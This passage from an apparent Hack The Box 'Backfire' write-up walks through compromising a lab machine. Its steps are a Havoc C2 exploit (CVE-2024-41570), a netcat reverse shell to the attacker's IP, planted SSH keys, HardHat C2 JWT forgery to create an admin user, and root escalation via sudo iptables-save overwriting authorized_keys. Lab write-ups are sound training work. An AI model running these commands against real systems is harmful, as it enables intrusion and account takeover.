</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>47</span><span class=p>:</span><span class=mi>54</span><span class=p>]</span> <span class=p>[</span><span class=nx>info</span><span class=p>]</span> <span class=nx>Started</span> <span class=s>&#34;Demon Listener&#34;</span> <span class=nx>listener</span></span></span></code></pre></td></tr></table></div></div><p>Using the <code>Ilya</code> account retrieved from the Havoc configuration file, we run the exploit with the following command to gain a reverse shell on the server:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=hl><span class=lnt> 1
</span></span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=hl><span class=lnt>11
</span></span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class="line hl"><span class=cl><span class=err>$</span> <span class=nx>python3</span> <span class=nx>CVE</span><span class=o>-</span><span class=mi>2024</span><span class=o>-</span><span class=mf>41570.</span><span class=nx>py</span> <span class=o>-</span><span class=nx>t</span> <span class=nx>https</span><span class=p>:</span><span class=c1>//10.10.11.49 -i 127.0.0.1 -p 40056 -U ilya -P &#39;CobaltStr1keSuckz!&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>***</span><span class=p>]</span> <span class=nx>Trying</span> <span class=nx>to</span> <span class=nx>register</span> <span class=nx>agent</span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>***</span><span class=p>]</span> <span class=nx>Success</span><span class=p>!</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>***</span><span class=p>]</span> <span class=nx>Trying</span> <span class=nx>to</span> <span class=nx>open</span> <span class=nx>socket</span> <span class=nx>on</span> <span class=nx>the</span> <span class=nx>teamserver</span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>***</span><span class=p>]</span> <span class=nx>Success</span><span class=p>!</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>***</span><span class=p>]</span> <span class=nx>Trying</span> <span class=nx>to</span> <span class=nx>write</span> <span class=nx>to</span> <span class=nx>the</span> <span class=nx>socket</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>***</span><span class=p>]</span> <span class=nx>Success</span><span class=p>!</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>***</span><span class=p>]</span> <span class=nx>Trying</span> <span class=nx>to</span> <span class=nx>poll</span> <span class=nx>teamserver</span> <span class=k>for</span> <span class=nx>socket</span> <span class=nx>output</span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>***</span><span class=p>]</span> <span class=nx>Read</span> <span class=nx>socket</span> <span class=nx>output</span> <span class=nx>successfully</span><span class=p>!</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class="line hl"><span class=cl><span class=nx>Enter</span> <span class=nx>command</span> <span class=nx>to</span> <span class=nx>execute</span><span class=p>:</span> <span class=nx>busybox</span> <span class=nx>nc</span> <span class=mf>10.10.14.173</span> <span class=mi>80</span> <span class=o>-</span><span class=nx>e</span> <span class=nx>sh</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>***</span><span class=p>]</span> <span class=nx>Trying</span> <span class=nx>to</span> <span class=nx>write</span> <span class=nx>to</span> <span class=nx>the</span> <span class=nx>socket</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>***</span><span class=p>]</span> <span class=nx>Success</span><span class=p>!</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>***</span><span class=p>]</span> <span class=nx>Trying</span> <span class=nx>to</span> <span class=nx>poll</span> <span class=nx>teamserver</span> <span class=k>for</span> <span class=nx>socket</span> <span class=nx>output</span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>***</span><span class=p>]</span> <span class=nx>Read</span> <span class=nx>socket</span> <span class=nx>output</span> <span class=nx>successfully</span><span class=p>!</span></span></span></code></pre></td></tr></table></div></div><p>As the reverse shell was unstable and kept disconnecting, we add our public SSH key to Ilyaâ€™s SSH authorized_keys file for a more stable access.<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=hl><span class=lnt>1
</span></span><span class=lnt>2
</span><span class=lnt>3
</span><span class=hl><span class=lnt>4
</span></span><span class=hl><span class=lnt>5
</span></span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class="line hl"><span class=cl><span class=err>$</span> <span class=nx>nc</span> <span class=o>-</span><span class=nx>lvnp</span> <span class=mi>80</span>
</span></span><span class=line><span class=cl><span class=nx>listening</span> <span class=nx>on</span> <span class=p>[</span><span class=kt>any</span><span class=p>]</span> <span class=mi>80</span> <span class=o>...</span>
</span></span><span class=line><span class=cl><span class=nx>connect</span> <span class=nx>to</span> <span class=p>[</span><span class=mf>10.10.14.173</span><span class=p>]</span> <span class=nf>from</span> <span class=p>(</span><span class=nx>UNKNOWN</span><span class=p>)</span> <span class=p>[</span><span class=mf>10.10.11.49</span><span class=p>]</span> <span class=mi>60884</span>
</span></span><span class="line hl"><span class=cl><span class=nx>echo</span> <span class=s>&#34;ssh-ed25519 A...k kali@kali&#34;</span> <span class=o>&gt;&gt;</span> <span class=o>/</span><span class=nx>home</span><span class=o>/</span><span class=nx>ilya</span><span class=o>/</span><span class=p>.</span><span class=nx>ssh</span><span class=o>/</span><span class=nx>authorized_keys</span>
</span></span><span class="line hl"><span class=cl><span class=nx>cat</span> <span class=o>/</span><span class=nx>home</span><span class=o>/</span><span class=nx>ilya</span><span class=o>/</span><span class=p>.</span><span class=nx>ssh</span><span class=o>/</span><span class=nx>authorized_keys</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=nx>ssh</span><span class=o>-</span><span class=nx>ed25519</span> <span class=nx>A</span><span class=o>...</span><span class=nx>k</span> <span class=nx>kali</span><span class=err>@</span><span class=nx>kali</span></span></span></code></pre></td></tr></table></div></div></p><p>Then, we can access the server via SSH and grab the user flag.<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=hl><span class=lnt>1
</span></span><span class=lnt>2
</span><span class=hl><span class=lnt>3
</span></span><span class=lnt>4
</span><span class=hl><span class=lnt>5
</span></span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class="line hl"><span class=cl><span class=err>$</span> <span class=nx>ssh</span> <span class=o>-</span><span class=nx>i</span> <span class=p>~</span><span class=o>/</span><span class=p>.</span><span class=nx>ssh</span><span class=o>/</span><span class=nx>id_ed25519</span> <span class=nx>ilya</span><span class=err>@</span><span class=mf>10.10.11.49</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class="line hl"><span class=cl><span class=nx>ilya</span><span class=err>@</span><span class=nx>backfire</span><span class=p>:~</span><span class=err>$</span> <span class=nx>ls</span>
</span></span><span class=line><span class=cl><span class=nx>files</span>  <span class=nx>hardhat</span><span class=p>.</span><span class=nx>txt</span>  <span class=nx>Havoc</span>  <span class=nx>user</span><span class=p>.</span><span class=nx>txt</span>
</span></span><span class="line hl"><span class=cl><span class=nx>ilya</span><span class=err>@</span><span class=nx>backfire</span><span class=p>:~</span><span class=err>$</span> <span class=nx>cat</span> <span class=nx>user</span><span class=p>.</span><span class=nx>txt</span>
</span></span><span class=line><span class=cl><span class=nx>b96</span><span class=p>[</span><span class=o>...</span><span class=p>]</span><span class=mo>016</span><span class=nx>b</span></span></span></code></pre></td></tr></table></div></div></p><h2 id=lateral-mouvement-sergej>Lateral mouvement: Sergej</h2><h3 id=exploit-hardhat-c2-authentification-bypass--rce>Exploit HardHat C2: Authentification bypass + RCE</h3><p>Inside <code>Ilya</code>â€™s home directory, there is a file called <code>hardhat.txt</code> containing the following content:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=hl><span class=lnt>1
</span></span><span class=lnt>2
</span><span class=hl><span class=lnt>3
</span></span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class="line hl"><span class=cl><span class=nx>ilya</span><span class=err>@</span><span class=nx>backfire</span><span class=p>:~</span><span class=err>$</span> <span class=nx>ls</span>
</span></span><span class=line><span class=cl><span class=nx>files</span>  <span class=nx>hardhat</span><span class=p>.</span><span class=nx>txt</span>  <span class=nx>Havoc</span>  <span class=nx>user</span><span class=p>.</span><span class=nx>txt</span>
</span></span><span class="line hl"><span class=cl><span class=nx>ilya</span><span class=err>@</span><span class=nx>backfire</span><span class=p>:~</span><span class=err>$</span> <span class=nx>cat</span> <span class=nx>hardhat</span><span class=p>.</span><span class=nx>txt</span>
</span></span><span class=line><span class=cl><span class=nx>Sergej</span> <span class=nx>said</span> <span class=nx>he</span> <span class=nx>installed</span> <span class=nx>HardHatC2</span> <span class=k>for</span> <span class=nx>testing</span> <span class=nx>and</span>  <span class=nx>not</span> <span class=nx>made</span> <span class=kt>any</span> <span class=nx>changes</span> <span class=nx>to</span> <span class=nx>the</span> <span class=nx>defaults</span>
</span></span><span class=line><span class=cl><span class=nx>I</span> <span class=nx>hope</span> <span class=nx>he</span> <span class=nx>prefers</span> <span class=nx>Havoc</span> <span class=nx>bcoz</span> <span class=nx>I</span> <span class=nx>don</span><span class=err>&#39;</span><span class=nx>t</span> <span class=nx>wanna</span> <span class=nx>learn</span> <span class=nx>another</span> <span class=nx>C2</span> <span class=nx>framework</span><span class=p>,</span> <span class=nx>also</span> <span class=nx>Go</span> <span class=p>&gt;</span> <span class=nx>C</span><span class=err>#</span> </span></span></code></pre></td></tr></table></div></div><p>Checking the open ports confirms that a <code>HardHat</code> instance, another command and control server, is running on the machine:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=hl><span class=lnt> 1
</span></span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=hl><span class=lnt> 4
</span></span><span class=hl><span class=lnt> 5
</span></span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class="line hl"><span class=cl><span class=nx>ilya</span><span class=err>@</span><span class=nx>backfire</span><span class=p>:~</span><span class=err>$</span> <span class=nx>netstat</span> <span class=o>-</span><span class=nx>planetu</span>
</span></span><span class=line><span class=cl><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=nx>Proto</span> <span class=nx>Recv</span><span class=o>-</span><span class=nx>Q</span> <span class=nx>Send</span><span class=o>-</span><span class=nx>Q</span> <span class=nx>Local</span> <span class=nx>Address</span>           <span class=nx>Foreign</span> <span class=nx>Address</span>         <span class=nx>State</span>       <span class=nx>User</span>       <span class=nx>Inode</span>      <span class=nx>PID</span><span class=o>/</span><span class=nx>Program</span> <span class=nx>name</span>    
</span></span><span class="line hl"><span class=cl><span class=nx>tcp</span>        <span class=mi>0</span>      <span class=mi>0</span> <span class=mf>0.0.0.0</span><span class=p>:</span><span class=mi>5000</span>            <span class=mf>0.0.0.0</span><span class=p>:</span><span class=o>*</span>               <span class=nx>LISTEN</span>      <span class=mi>1001</span>       <span class=mi>50679</span>      <span class=o>-</span>                   
</span></span><span class="line hl"><span class=cl><span class=nx>tcp</span>        <span class=mi>0</span>      <span class=mi>0</span> <span class=mf>0.0.0.0</span><span class=p>:</span><span class=mi>7096</span>            <span class=mf>0.0.0.0</span><span class=p>:</span><span class=o>*</span>               <span class=nx>LISTEN</span>      <span class=mi>1001</span>       <span class=mi>51911</span>      <span class=o>-</span>                   
</span></span><span class=line><span class=cl><span class=nx>tcp</span>        <span class=mi>0</span>      <span class=mi>0</span> <span class=mf>127.0.0.1</span><span class=p>:</span><span class=mi>40056</span>         <span class=mf>0.0.0.0</span><span class=p>:</span><span class=o>*</span>               <span class=nx>LISTEN</span>      <span class=mi>1000</span>       <span class=mi>54307</span>      <span class=o>-</span>                   
</span></span><span class=line><span class=cl><span class=nx>tcp</span>        <span class=mi>0</span>      <span class=mi>0</span> <span class=mf>0.0.0.0</span><span class=p>:</span><span class=mi>443</span>             <span class=mf>0.0.0.0</span><span class=p>:</span><span class=o>*</span>               <span class=nx>LISTEN</span>      <span class=mi>0</span>          <span class=mi>21679</span>      <span class=o>-</span>                   
</span></span><span class=line><span class=cl><span class=nx>tcp</span>        <span class=mi>0</span>      <span class=mi>0</span> <span class=mf>0.0.0.0</span><span class=p>:</span><span class=mi>22</span>              <span class=mf>0.0.0.0</span><span class=p>:</span><span class=o>*</span>               <span class=nx>LISTEN</span>      <span class=mi>0</span>          <span class=mi>22673</span>      <span class=o>-</span>                   
</span></span><span class=line><span class=cl><span class=nx>tcp</span>        <span class=mi>0</span>      <span class=mi>0</span> <span class=mf>0.0.0.0</span><span class=p>:</span><span class=mi>8000</span>            <span class=mf>0.0.0.0</span><span class=p>:</span><span class=o>*</span>               <span class=nx>LISTEN</span>      <span class=mi>0</span>          <span class=mi>21680</span>      <span class=o>-</span>                   
</span></span><span class=line><span class=cl><span class=nx>tcp</span>        <span class=mi>0</span>      <span class=mi>0</span> <span class=mf>127.0.0.1</span><span class=p>:</span><span class=mi>8443</span>          <span class=mf>0.0.0.0</span><span class=p>:</span><span class=o>*</span>               <span class=nx>LISTEN</span>      <span class=mi>1000</span>       <span class=mi>53569</span>      <span class=o>-</span>                   
</span></span><span class=line><span class=cl><span class=nx>tcp</span>        <span class=mi>0</span>      <span class=mi>0</span> <span class=mf>10.10.11.49</span><span class=p>:</span><span class=mi>55332</span>       <span class=mf>10.10.14.156</span><span class=p>:</span><span class=mi>80</span>         <span class=nx>ESTABLISHED</span> <span class=mi>1000</span>       <span class=mi>54389</span>      <span class=mi>4854</span><span class=o>/</span><span class=nx>sh</span>             
</span></span><span class=line><span class=cl><span class=nx>tcp</span>        <span class=mi>0</span>      <span class=mi>0</span> <span class=mf>127.0.0.1</span><span class=p>:</span><span class=mi>40056</span>         <span class=mf>127.0.0.1</span><span class=p>:</span><span class=mi>35702</span>         <span class=nx>ESTABLISHED</span> <span class=mi>1000</span>       <span class=mi>53582</span>      <span class=o>-</span>                   
</span></span><span class=line><span class=cl><span class=nx>tcp</span>        <span class=mi>0</span>      <span class=mi>0</span> <span class=mf>127.0.0.1</span><span class=p>:</span><span class=mi>35702</span>         <span class=mf>127.0.0.1</span><span class=p>:</span><span class=mi>40056</span>         <span class=nx>ESTABLISHED</span> <span class=mi>1000</span>       <span class=mi>54337</span>      <span class=o>-</span>                   
</span></span><span class=line><span class=cl><span class=nx>tcp</span>        <span class=mi>0</span>    <span class=mi>272</span> <span class=mf>10.10.11.49</span><span class=p>:</span><span class=mi>22</span>          <span class=mf>10.10.14.156</span><span class=p>:</span><span class=mi>36602</span>      <span class=nx>ESTABLISHED</span> <span class=mi>0</span>          <span class=mi>53621</span>      <span class=o>-</span>                   
</span></span><span class=line><span class=cl><span class=nx>tcp6</span>       <span class=mi>0</span>      <span class=mi>0</span> <span class=p>:::</span><span class=mi>22</span>                   <span class=p>:::</span><span class=o>*</span>                    <span class=nx>LISTEN</span>      <span class=mi>0</span>          <span class=mi>22684</span>      <span class=o>-</span>                   
</span></span><span class=line><span class=cl><span class=nx>udp</span>        <span class=mi>0</span>      <span class=mi>0</span> <span class=mf>0.0.0.0</span><span class=p>:</span><span class=mi>68</span>              <span class=mf>0.0.0.0</span><span class=p>:</span><span class=o>*</span>                           <span class=mi>0</span>          <span class=mi>15357</span>      <span class=o>-</span>                   
</span></span><span class=line><span class=cl><span class=nx>udp</span>        <span class=mi>0</span>      <span class=mi>0</span> <span class=mf>10.10.11.49</span><span class=p>:</span><span class=mi>43747</span>       <span class=mf>8.8.8.8</span><span class=p>:</span><span class=mi>53</span>              <span class=nx>ESTABLISHED</span> <span class=mi>997</span>        <span class=mi>54599</span>      <span class=o>-</span>                   
</span></span><span class=line><span class=cl><span class=nx>udp</span>        <span class=mi>0</span>      <span class=mi>0</span> <span class=mf>10.10.11.49</span><span class=p>:</span><span class=mi>58233</span>       <span class=mf>8.8.8.8</span><span class=p>:</span><span class=mi>53</span>              <span class=nx>ESTABLISHED</span> <span class=mi>1001</span>       <span class=mi>53738</span>      <span class=o>-</span>                   
</span></span><span class=line><span class=cl><span class=nx>udp</span>        <span class=mi>0</span>      <span class=mi>0</span> <span class=mf>10.10.11.49</span><span class=p>:</span><span class=mi>44241</span>       <span class=mf>8.8.8.8</span><span class=p>:</span><span class=mi>53</span>              <span class=nx>ESTABLISHED</span> <span class=mi>1001</span>       <span class=mi>54632</span>      <span class=o>-</span> </span></span></code></pre></td></tr></table></div></div><p>Since <code>Sergej</code> made no changes to the default configuration of the C2, we will rely on the following article to compromise his account:
<a class=link href=https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7 target=_blank rel=noopener>https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7</a></p><p>More specifically, we focus on vulnerabilities 2 and 3.</p><p>The first vulnerability, an authentication bypass, exploits the fact that HardHat uses a static key to sign JWTs, which here allows us to create authentication tokens for any role.</p><p>We then forward the port 5000 to use the script from the article and create a new user with the role of <code>TeamLead</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=hl><span class=lnt>1
</span></span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class="line hl"><span class=cl><span class=nx>ssh</span> <span class=o>-</span><span class=nx>L</span> <span class=mi>5000</span><span class=p>:</span><span class=nx>localhost</span><span class=p>:</span><span class=mi>5000</span> <span class=nx>ilya</span><span class=err>@</span><span class=mf>10.10.11.49</span></span></span></code></pre></td></tr></table></div></div><p>In the script, we set set the <code>rhost</code>parameter to <code>rhost = 'localhost:5000'</code> and proceed to create our new user.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=hl><span class=lnt>1
</span></span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=hl><span class=lnt>6
</span></span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class="line hl"><span class=cl><span class=err>$</span> <span class=nx>python3</span> <span class=p>.</span><span class=o>/</span><span class=nx>exploit</span><span class=p>.</span><span class=nx>py</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=nx>Generated</span> <span class=nx>JWT</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=nx>ey</span><span class=o>...</span><span class=nx>oH6CDUNc</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class="line hl"><span class=cl><span class=nx>User</span> <span class=nx>sth_pentest</span> <span class=nx>created</span></span></span></code></pre></td></tr></table></div></div><p>Now that our user has been created, we&rsquo;ll exploit the second vulnerability to achieve code execution through the HardHat interface available on port 7096.</p><p>First, we forward this port and log in using our <code>stj_pentest</code> account.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=hl><span class=lnt>1
</span></span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class="line hl"><span class=cl><span class=err>$</span> <span class=nx>ssh</span> <span class=o>-</span><span class=nx>L</span> <span class=mi>7096</span><span class=p>:</span><span class=nx>localhost</span><span class=p>:</span><span class=mi>7096</span> <span class=nx>ilya</span><span class=err>@</span><span class=mf>10.10.11.49</span></span></span></code></pre></td></tr></table></div></div><p>Next, we will access the <code>ImplantInteract</code> page to use the integrated console.</p><p>We confirm that commands are executed as <code>Sergej</code>, so we add our public key to this user&rsquo;s authorized_keys file in order to connect via SSH.</p><p><img src=/p/backfire-htb-writeup-linux-medium/HardHat-Console1.png width=972 height=752 srcset="/p/backfire-htb-writeup-linux-medium/HardHat-Console1_hu_e2d8a9fb05755c10.png 480w, /p/backfire-htb-writeup-linux-medium/HardHat-Console1_hu_9ef9514df24c6ed0.png 1024w" loading=lazy class=gallery-image data-flex-grow=129 data-flex-basis=310px></p><p><img src=/p/backfire-htb-writeup-linux-medium/HardHat-Console2.png width=961 height=119 srcset="/p/backfire-htb-writeup-linux-medium/HardHat-Console2_hu_f16c283fb5549909.png 480w, /p/backfire-htb-writeup-linux-medium/HardHat-Console2_hu_61a1feae2d5c74e2.png 1024w" loading=lazy class=gallery-image data-flex-grow=807 data-flex-basis=1938px></p><h2 id=root>Root</h2><h3 id=sudo-misconfiguration>Sudo misconfiguration</h3><p>Once connected via SSH, we notice a misconfiguration of the sudo utility for the user <code>Sergej</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=hl><span class=lnt> 1
</span></span><span class=lnt> 2
</span><span class=hl><span class=lnt> 3
</span></span><span class=lnt> 4
</span><span class=hl><span class=lnt> 5
</span></span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=hl><span class=lnt>17
</span></span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=hl><span class=lnt>22
</span></span><span class=hl><span class=lnt>23
</span></span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class="line hl"><span class=cl><span class=err>$</span> <span class=nx>ssh</span> <span class=o>-</span><span class=nx>i</span> <span class=p>~</span><span class=o>/</span><span class=p>.</span><span class=nx>ssh</span><span class=o>/</span><span class=nx>id_ed25519</span> <span class=nx>sergej</span><span class=err>@</span><span class=mf>10.10.11.49</span>          
</span></span><span class=line><span class=cl><span class=nx>Linux</span> <span class=nx>backfire</span> <span class=mf>6.1.0</span><span class=o>-</span><span class=mi>29</span><span class=o>-</span><span class=nx>amd64</span> <span class=err>#</span><span class=mi>1</span> <span class=nx>SMP</span> <span class=nx>PREEMPT_DYNAMIC</span> <span class=nx>Debian</span> <span class=mf>6.1.123</span><span class=o>-</span><span class=mi>1</span> <span class=p>(</span><span class=mi>2025</span><span class=o>-</span><span class=mo>01</span><span class=o>-</span><span class=mo>02</span><span class=p>)</span> <span class=nx>x86_64</span>
</span></span><span class="line hl"><span class=cl><span class=nx>sergej</span><span class=err>@</span><span class=nx>backfire</span><span class=p>:~</span><span class=err>$</span> <span class=nx>ls</span>
</span></span><span class=line><span class=cl><span class=nx>HardHatC2</span>  <span class=nx>hardhat_firewall</span><span class=p>.</span><span class=nx>sh</span>
</span></span><span class="line hl"><span class=cl><span class=nx>sergej</span><span class=err>@</span><span class=nx>backfire</span><span class=p>:~</span><span class=err>$</span> <span class=nx>cat</span> <span class=nx>hardhat_firewall</span><span class=p>.</span><span class=nx>sh</span> 
</span></span><span class=line><span class=cl><span class=err>#</span><span class=p>!</span><span class=o>/</span><span class=nx>bin</span><span class=o>/</span><span class=nx>bash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>#</span><span class=nx>sudo</span> <span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>sbin</span><span class=o>/</span><span class=nx>iptables</span><span class=o>-</span><span class=nx>save</span> <span class=p>&gt;</span> <span class=o>/</span><span class=nx>tmp</span><span class=o>/</span><span class=nx>rules</span><span class=p>.</span><span class=nx>v4</span>
</span></span><span class=line><span class=cl><span class=nx>sudo</span> <span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>sbin</span><span class=o>/</span><span class=nx>iptables</span> <span class=o>-</span><span class=nx>F</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>sudo</span> <span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>sbin</span><span class=o>/</span><span class=nx>iptables</span> <span class=o>-</span><span class=nx>A</span> <span class=nx>INPUT</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>tcp</span> <span class=o>-</span><span class=nx>s</span> <span class=nx>localhost</span> <span class=o>--</span><span class=nx>dport</span> <span class=mi>5000</span> <span class=o>-</span><span class=nx>j</span> <span class=nx>ACCEPT</span>
</span></span><span class=line><span class=cl><span class=nx>sudo</span> <span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>sbin</span><span class=o>/</span><span class=nx>iptables</span> <span class=o>-</span><span class=nx>A</span> <span class=nx>INPUT</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>tcp</span> <span class=o>--</span><span class=nx>dport</span> <span class=mi>5000</span> <span class=o>-</span><span class=nx>j</span> <span class=nx>REJECT</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>sudo</span> <span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>sbin</span><span class=o>/</span><span class=nx>iptables</span> <span class=o>-</span><span class=nx>A</span> <span class=nx>INPUT</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>tcp</span> <span class=o>-</span><span class=nx>s</span> <span class=nx>localhost</span> <span class=o>--</span><span class=nx>dport</span> <span class=mi>7096</span> <span class=o>-</span><span class=nx>j</span> <span class=nx>ACCEPT</span>
</span></span><span class=line><span class=cl><span class=nx>sudo</span> <span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>sbin</span><span class=o>/</span><span class=nx>iptables</span> <span class=o>-</span><span class=nx>A</span> <span class=nx>INPUT</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>tcp</span> <span class=o>--</span><span class=nx>dport</span> <span class=mi>7096</span> <span class=o>-</span><span class=nx>j</span> <span class=nx>REJECT</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl><span class=nx>sergej</span><span class=err>@</span><span class=nx>backfire</span><span class=p>:~</span><span class=err>$</span> <span class=nx>sudo</span> <span class=o>-</span><span class=nx>l</span>
</span></span><span class=line><span class=cl><span class=nx>Matching</span> <span class=nx>Defaults</span> <span class=nx>entries</span> <span class=k>for</span> <span class=nx>sergej</span> <span class=nx>on</span> <span class=nx>backfire</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nx>env_reset</span><span class=p>,</span> <span class=nx>mail_badpass</span><span class=p>,</span> <span class=nx>secure_path</span><span class=p>=</span><span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>local</span><span class=o>/</span><span class=nx>sbin</span><span class=err>\</span><span class=p>:</span><span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>local</span><span class=o>/</span><span class=nx>bin</span><span class=err>\</span><span class=p>:</span><span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>sbin</span><span class=err>\</span><span class=p>:</span><span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>bin</span><span class=err>\</span><span class=p>:</span><span class=o>/</span><span class=nx>sbin</span><span class=err>\</span><span class=p>:</span><span class=o>/</span><span class=nx>bin</span><span class=p>,</span> <span class=nx>use_pty</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>User</span> <span class=nx>sergej</span> <span class=nx>may</span> <span class=nx>run</span> <span class=nx>the</span> <span class=nx>following</span> <span class=nx>commands</span> <span class=nx>on</span> <span class=nx>backfire</span><span class=p>:</span>
</span></span><span class="line hl"><span class=cl>    <span class=p>(</span><span class=nx>root</span><span class=p>)</span> <span class=nx>NOPASSWD</span><span class=p>:</span> <span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>sbin</span><span class=o>/</span><span class=nf>iptables</span>
</span></span><span class="line hl"><span class=cl>    <span class=p>(</span><span class=nx>root</span><span class=p>)</span> <span class=nx>NOPASSWD</span><span class=p>:</span> <span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>sbin</span><span class=o>/</span><span class=nx>iptables</span><span class=o>-</span><span class=nx>save</span></span></span></code></pre></td></tr></table></div></div><p>We will rely on the following article to escalate our privileges: <a class=link href=https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/ target=_blank rel=noopener>https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/</a></p><p>Here, the preservation of newlines in <code>iptables</code> comments allows us to write to an arbitrary file using <code>iptables-save</code>.</p><p>We proceed to overwrite the root authorized_keys file to add our own key allowing us to gain SSH access as <code>root</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=hl><span class=lnt> 1
</span></span><span class=hl><span class=lnt> 2
</span></span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=hl><span class=lnt>15
